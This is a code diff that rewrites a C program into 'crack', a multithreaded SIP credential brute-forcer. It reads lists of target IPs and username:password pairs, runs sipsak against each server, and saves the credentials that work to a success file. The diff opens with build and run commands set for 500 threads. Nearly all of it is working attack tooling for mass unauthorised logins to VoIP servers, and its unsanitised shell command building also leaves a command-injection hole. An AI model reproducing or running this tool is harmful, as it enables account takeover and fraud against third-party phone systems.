@@ -1,245 +1,248 @@
+gcc crack.c -o crack -pthread
+./crack --protocol 1 --threads 500 --targets 500 --targets-file ip.txt --user-pass-file User_Pass --success-file success.txt --reservation-file reservations.txt
+
+=====================================
+
+
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <pthread.h>
 #include <getopt.h>
+#include <string.h>
+#include <pthread.h>
+#include <unistd.h>
 
-#define MAX_USERNAME_LEN 50
-#define MAX_PASSWORD_LEN 50
-#define MAX_TARGET_LEN 100
-#define MAX_SUCCESS_RESULTS 1000
-#define MAX_RESERVATIONS 1000
+// Define constants for protocol types
+#define PROTOCOL_TCP 0
+#define PROTOCOL_UDP 1
+#define PROTOCOL_TLS 2
 
-char defaultUser[] = "MOH100";
-char defaultPass[] = "12345";
-char User_Pass[] = "User_Pass";
-char ipFile[] = "ip.txt";
-char successFile[] = "Success_results.txt";
-char reservationsFile[] = "reservations_targets.txt";
+// Define constant for max size of a line in input files
+#define MAX_LINE_SIZE 1024
 
-char sipsakCmd[MAX_TARGET_LEN + 100] = { 0 };
-char successResults[MAX_SUCCESS_RESULTS][MAX_TARGET_LEN];
-char reservations[MAX_RESERVATIONS][MAX_TARGET_LEN];
-
-int numSuccessResults = 0;
-int numReservations = 0;
-
-struct UserInfo {
-    char username[MAX_USERNAME_LEN];
-    char password[MAX_PASSWORD_LEN];
-};
-
-struct TargetInfo {
-    char target[MAX_TARGET_LEN];
+// Define structures to store target and user/pass information
+typedef struct {
+    char ip[100]; // to store IP or domain
     int port;
-};
+} Target;
 
-struct TestJob {
-    struct UserInfo userInfo;
-    struct TargetInfo targetInfo;
-};
+typedef struct {
+    char username[100];
+    char password[100];
+} UserPass;
 
-void printUsage() {
-    printf("Usage: ./sipsak_checker [udp|tcp|tls] [num_threads] [num_targets]\n");
+// Global variables to hold user options
+int protocol = PROTOCOL_TCP;
+int num_threads = 10;
+int num_targets = 5000;
+char targets_file[MAX_LINE_SIZE] = "ip.txt";
+char user_pass_file[MAX_LINE_SIZE] = "User_Pass";
+char success_file[MAX_LINE_SIZE] = "Success_results.txt";
+char reservation_file[MAX_LINE_SIZE] = "reservations_targets.txt";
+Target* targets;
+int num_user_pass;
+UserPass* user_passes;
+
+// Function prototypes
+Target* read_targets(const char* filename, int* num_targets);
+UserPass* read_user_pass(const char* filename, int* num_user_pass);
+void print_usage();
+void sip_crack(Target* target, UserPass* user_pass);
+void* thread_function(void* arg);
+
+// Function to read targets from file
+Target* read_targets(const char* filename, int* num_targets) {
+    FILE* file = fopen(filename, "r");
+    if (!file) {
+        perror("Failed to open targets file");
+        exit(EXIT_FAILURE);
+    }
+
+    Target* targets = malloc(sizeof(Target) * 10000);
+    *num_targets = 0;
+    char line[MAX_LINE_SIZE];
+    while (*num_targets < 10000 && fgets(line, sizeof(line), file)) {
+        sscanf(line, "%[^:]:%d", targets[*num_targets].ip, &targets[*num_targets].port);
+        (*num_targets)++;
+    }
+    fclose(file);
+    return targets;
 }
 
-void readUserPass(struct UserInfo *userInfoArr, int *numUsers) {
-    FILE *fp;
-    char buffer[MAX_USERNAME_LEN + MAX_PASSWORD_LEN + 2];
-    char *p;
-    int i = 0;
-    fp = fopen(User_Pass, "r");
-    if (fp == NULL) {
-        perror("Error opening User_Pass file");
+// Function to read usernames and passwords from file
+UserPass* read_user_pass(const char* filename, int* num_user_pass) {
+    FILE* file = fopen(filename, "r");
+    if (!file) {
+        perror("Failed to open username and password file");
         exit(EXIT_FAILURE);
     }
-    while (fgets(buffer, MAX_USERNAME_LEN + MAX_PASSWORD_LEN + 2, fp) != NULL) {
-        p = strtok(buffer, " \t\n");
-        if (p != NULL) {
-            strcpy(userInfoArr[i].username, p);
-        }
-        p = strtok(NULL, " \t\n");
-        if (p != NULL) {
-            strcpy(userInfoArr[i].password, p);
-        }
-        i++;
+
+    UserPass* user_passes = malloc(sizeof(UserPass) * 10000);
+    *num_user_pass = 0;
+    char line[MAX_LINE_SIZE];
+    while (*num_user_pass < 10000 && fgets(line, sizeof(line), file)) {
+        sscanf(line, "%[^:]:%s", user_passes[*num_user_pass].username, user_passes[*num_user_pass].password);
+        (*num_user_pass)++;
     }
-    *numUsers = i;
-    fclose(fp);
+    fclose(file);
+    return user_passes;
 }
 
-void readTargets(struct TargetInfo *targetInfoArr, int *numTargets) {
-    FILE *fp;
-    char buffer[MAX_TARGET_LEN + 10];
-    char *p;
-    int i = 0;
-    fp = fopen(ipFile, "r");
-    if (fp == NULL) {
-        perror("Error opening ip.txt file");
-        exit(EXIT_FAILURE);
-    }
-    while (fgets(buffer, MAX_TARGET_LEN + 10, fp) != NULL) {
-        p = strtok(buffer, ":");
-        if (p != NULL) {
-            strcpy(targetInfoArr[i].target, p);
-        }
-        p = strtok(NULL, ":\n");
-        if (p != NULL) {
-            targetInfoArr[i].port = atoi(p);
-        }
-        i++;
-    }
-    *numTargets = i;
-    fclose(fp);
+// Function to print usage information
+void print_usage() {
+    printf("Usage: ./crack [options]\n"
+           "Options:\n"
+           "    -p, --protocol <PROTOCOL_TCP, PROTOCOL_UDP, PROTOCOL_TLS>\n"
+           "    -t, --threads <number of threads>\n"
+           "    -T, --targets <number of targets>\n"
+           "    -f, --targets-file <file with targets>\n"
+           "    -u, --user-pass-file <file with usernames and passwords>\n"
+           "    -s, --success-file <file to write successful attempts>\n"
+           "    -r, --reservation-file <file to write reservations>\n"
+           "    -h, --help\n");
 }
 
-void logSuccessResult(char *target) {
-    FILE *fp;
-    fp = fopen(successFile, "a");
-    if (fp == NULL) {
-        perror("Error opening Success_results.txt file");
-        exit(EXIT_FAILURE);
-    }
-    fprintf(fp, "%s\n", target);
-    fclose(fp);
-}
+// Function to perform cracking for a specific target and user/pass combination
+void sip_crack(Target* target, UserPass* user_pass) {
+    char command[MAX_LINE_SIZE];
+    char protocol_str[MAX_LINE_SIZE];
 
-void logReservation(char *target) {
-    FILE *fp;
-    fp = fopen(reservationsFile, "a");
-    if (fp == NULL) {
-        perror("Error opening reservations_targets.txt file");
-        exit(EXIT_FAILURE);
+    if (protocol == PROTOCOL_TCP) {
+        strncpy(protocol_str, "tcp", MAX_LINE_SIZE - 1);
+    } else if (protocol == PROTOCOL_UDP) {
+        strncpy(protocol_str, "udp", MAX_LINE_SIZE - 1);
+    } else if (protocol == PROTOCOL_TLS) {
+        strncpy(protocol_str, "tls --tls-ignore-cert-failure", MAX_LINE_SIZE - 1);
+    } else {
+        fprintf(stderr, "Invalid protocol specified.\n");
+        return;
     }
-    fprintf(fp, "%s\n", target);
-    fclose(fp);
-}
 
-void *testTargets(void *arg) {
-    struct TestJob *job = (struct TestJob*)arg;
-    char target[MAX_TARGET_LEN];
-    char response[100];
-    int i, res;
-    for (i = 0; i < MAX_TARGET_LEN; i++) {
-        target[i] = job->targetInfo.target[i];
-        if (target[i] == '\0') {
-            break;
-        }
-    }
-    sprintf(sipsakCmd, "sipsak -U -C sip:%s -s sip:%s:%d -u %s -a %s -H %s -i -vvv -E %s",
-        target, target, job->targetInfo.port, job->userInfo.username, job->userInfo.password, target, arg);
-    for (i = 0; i < 3; i++) {
-        res = system(sipsakCmd);
-        if (res == 0) {
-            sprintf(response, "%d OK", res);
-            printf("%s\n", response);
-            strcpy(successResults[numSuccessResults], target);
-            numSuccessResults++;
-            logSuccessResult(target);
-            break;
-        }
-        else {
-            sprintf(response, "%d", res);
-            printf("%s\n", response);
-        }
-        sleep(1); // wait for 1 second before the next attempt
-    }
-    if (i == 3) {
-        if (strstr(response, "401 Unauthorized") != NULL) {
-            printf("Target %s requires authentication\n", target);
-            logReservation(target);
-        }
-        else if (strstr(response, "407 Proxy Authentication Required") != NULL) {
-            printf("Target %s requires proxy authentication\n", target);
-            logReservation(target);
-        }
-        else if (strstr(response, "200 OK") != NULL) {
-            printf("Target %s responded with 200 OK\n", target);
-            strcpy(successResults[numSuccessResults], target);
-            numSuccessResults++;
-            logSuccessResult(target);
-        }
-        else if (strstr(response, "202 Accepted") != NULL) {
-            printf("Target %s responded with 202 Accepted\n", target);
-            strcpy(successResults[numSuccessResults], target);
-            numSuccessResults++;
-            logSuccessResult(target);
-        }
-        else if (strstr(response, "204 No Notification") != NULL) {
-            printf("Target %s responded with 204 No Notification\n", target);
-            strcpy(successResults[numSuccessResults], target);
-            numSuccessResults++;
-            logSuccessResult(target);
-        }
-        else {
-            printf("Target %s did not respond with a successful message\n", target);
-        }
-    }
-    free(job);
-    pthread_exit(NULL);
-}
+    snprintf(command, MAX_LINE_SIZE, "sipsak -U -C sip:%s@%s -s sip:%s@%s:%d -u %s -a %s -H %s -i -vvv -E %s 2>&1",
+             user_pass->username, target->ip,
+             user_pass->username, target->ip, target->port,
+             user_pass->username, user_pass->password,
+             target->ip, protocol_str);
 
-int main(int argc, char *argv[]) {
-    if (argc != 4) {
-        printUsage();
-        exit(EXIT_FAILURE);
+    printf("Running command: %s\n", command);
+
+    // Open the command as a pipe and read the output
+    FILE* pipe = popen(command, "r");
+    if (!pipe) {
+        perror("Failed to open pipe");
+        return;
     }
-    int numThreads = atoi(argv[2]);
-    int numTargets = atoi(argv[3]);
-    if (numThreads <= 0 || numTargets <= 0) {
-        printf("Error: num_threads and num_targets must be positive integers\n");
-        exit(EXIT_FAILURE);
-    }
-    char *protocol = argv[1];
-    if (strcmp(protocol, "udp") != 0 && strcmp(protocol, "tcp") != 0 && strcmp(protocol, "tls") != 0) {
-        printf("Error: unsupported protocol %s\n", protocol);
-        exit(EXIT_FAILURE);
-    }
-    printf("Testing with %d threads and %d targets using %s protocol\n", numThreads, numTargets, protocol);
-    struct UserInfo userInfoArr[100];
-    int numUsers = 0;
-    readUserPass(userInfoArr, &numUsers);
-    printf("Read %d usernames and passwords from %s\n", numUsers, User_Pass);
-    struct TargetInfo targetInfoArr[10000];
-    int i, j, numPerThread, numLeftover, numTotal = 0;
-    readTargets(targetInfoArr, &numTotal);
-    printf("Read %d targets from %s\n", numTotal, ipFile);
-    pthread_t threads[numThreads];
-    for (i = 0; i < numThreads; i++) {
-        numPerThread = numTargets / numThreads;
-        numLeftover = numTargets % numThreads;
-        if (i < numLeftover) {
-            numPerThread++;
-        }
-        struct TestJob *jobs[numPerThread * numUsers];
-        int numJobs = 0;
-        for (j = 0; j < numTargets; j++) {
-            if (j % numThreads == i) {
-                if (numJobs >= numPerThread * numUsers) {
-                    break;
-                }
-                int k;
-                for (k = 0; k < numUsers; k++) {
-                    if (strcmp(userInfoArr[k].username, defaultUser) != 0 || strcmp(userInfoArr[k].password, defaultPass) != 0) {
-                        struct TestJob *job = (struct TestJob*)malloc(sizeof(struct TestJob));
-                        job->userInfo = userInfoArr[k];
-                        job->targetInfo = targetInfoArr[j];
-                        jobs[numJobs] = job;
-                        numJobs++;
-                    }
-                }
+
+    // Read each line of the output
+    char buffer[MAX_LINE_SIZE];
+    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+        // Check if the response contains "200 OK", "202 Accepted", or "204 No Notification"
+        if (strstr(buffer, "200 OK") || strstr(buffer, "202 Accepted") || strstr(buffer, "204 No Notification")) {
+            printf("Success: %s\n", buffer);
+            // Write the successful attempt to the success file
+            FILE* success = fopen(success_file, "a");
+            if (success) {
+                fprintf(success, "Target: %s:%d, Username: %s, Password: %s\n", target->ip, target->port, user_pass->username, user_pass->password);
+                fclose(success);
+            } else {
+                perror("Failed to write success results");
             }
-        }
-        printf("Thread %d will test %d targets\n", i, numJobs / numUsers);
-        int t;
-        for (t = 0; t < numJobs; t++) {
-            pthread_create(&threads[i], NULL, testTargets, jobs[t]);
+            break; // Break the loop if successful response is found
         }
     }
-    for (i = 0; i < numThreads; i++) {
-        pthread_join(threads[i], NULL);
+
+    pclose(pipe);
+}
+
+// Thread function for cracking
+void* thread_function(void* arg) {
+    int thread_id = *(int*)arg;
+    int targets_per_thread = num_targets / num_threads;
+    int start = thread_id * targets_per_thread;
+    int end = (thread_id == num_threads - 1) ? num_targets : (thread_id + 1) * targets_per_thread;
+
+    for (int i = start; i < end; i++) {
+        for (int j = 0; j < num_user_pass; j++) {
+            sip_crack(&targets[i], &user_passes[j]);
+        }
     }
-    printf("Test completed. %d targets accepted valid credentials, and %d targets did not accept default credentials\n", numSuccessResults, numReservations);
-    exit(EXIT_SUCCESS);
+
+    return NULL;
+}
+
+// Entry point of the program
+int main(int argc, char* argv[]) {
+    // Variables to hold user options
+
+    // Struct for getopt
+    static struct option long_options[] = {
+        {"protocol", required_argument, NULL, 'p'},
+        {"threads", required_argument, NULL, 't'},
+        {"targets", required_argument, NULL, 'T'},
+        {"targets-file", required_argument, NULL, 'f'},
+        {"user-pass-file", required_argument, NULL, 'u'},
+        {"success-file", required_argument, NULL, 's'},
+        {"reservation-file", required_argument, NULL, 'r'},
+        {"help", no_argument, NULL, 'h'},
+        {NULL, 0, NULL, 0}};
+
+    // Parse options
+    int opt;
+    while ((opt = getopt_long(argc, argv, "p:t:T:f:u:s:r:h", long_options, NULL)) != -1) {
+        switch (opt) {
+            case 'p':
+                protocol = atoi(optarg);
+                break;
+            case 't':
+                num_threads = atoi(optarg);
+                break;
+            case 'T':
+                num_targets = atoi(optarg);
+                break;
+            case 'f':
+                strncpy(targets_file, optarg, MAX_LINE_SIZE - 1);
+                break;
+            case 'u':
+                strncpy(user_pass_file, optarg, MAX_LINE_SIZE - 1);
+                break;
+            case 's':
+                strncpy(success_file, optarg, MAX_LINE_SIZE - 1);
+                break;
+            case 'r':
+                strncpy(reservation_file, optarg, MAX_LINE_SIZE - 1);
+                break;
+            case 'h':
+            default:
+                print_usage();
+                return EXIT_SUCCESS;
+        }
+    }
+
+    // Load targets and user/pass data from files
+    targets = read_targets(targets_file, &num_targets);
+    user_passes = read_user_pass(user_pass_file, &num_user_pass);
+
+    // Create threads and perform cracking in parallel
+    pthread_t threads[num_threads];
+    int thread_ids[num_threads];
+    for (int i = 0; i < num_threads; i++) {
+        thread_ids[i] = i;
+        if (pthread_create(&threads[i], NULL, thread_function, &thread_ids[i]) != 0) {
+            perror("Failed to create thread");
+            exit(EXIT_FAILURE);
+        }
+    }
+
+    // Wait for threads to finish
+    for (int i = 0; i < num_threads; i++) {
+        if (pthread_join(threads[i], NULL) != 0) {
+            perror("Failed to join thread");
+            exit(EXIT_FAILURE);
+        }
+    }
+
+    // Cleanup
+    free(targets);
+    free(user_passes);
+
+    return EXIT_SUCCESS;
 }
